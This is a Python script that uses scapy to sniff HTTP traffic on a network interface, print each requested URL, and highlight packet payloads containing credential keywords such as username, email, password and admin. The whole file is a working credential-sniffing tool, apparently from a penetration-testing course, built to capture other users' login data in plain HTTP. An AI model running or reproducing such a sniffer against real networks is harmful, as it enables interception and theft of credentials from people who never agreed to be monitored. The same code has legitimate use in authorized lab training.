#!/usr/bin/env python

import optparse
import scapy.all as scapy
from scapy.layers import http

# get commmand line args for interface
def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i","--interface",dest="interface",help="interfacet to spoof packets on")
    (options, arguments) = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please enter an interface to use for packet sniffing, use --help for more info")
    else:
        return options


# sniff function
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

# get the url of the packet
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

# check if the main raw data layer of the packet contains any of the desired keywords and return the load if it does
def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username","user","email","login","password","pass","secret","log","pwd","passwd","mail","admin","administrator"]
        for keyword in keywords:
            if keyword in load:
                return load


# process the sniffed packets
def process_sniffed_packet(packet):
    # is it http?
    if packet.haslayer(http.HTTPRequest):
        # get the url and print it
        url = get_url(packet)
        print("[+] HTTP URL >> "+url)
        
        # check for any interesting info and print it in red if found
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n\033[1;31;47m[+] ALERT!\n" + login_info+ "\n[+] ALERT!\x1b[0m\n\n")

# run the main program
options = get_arguments()
sniff(options.interface)
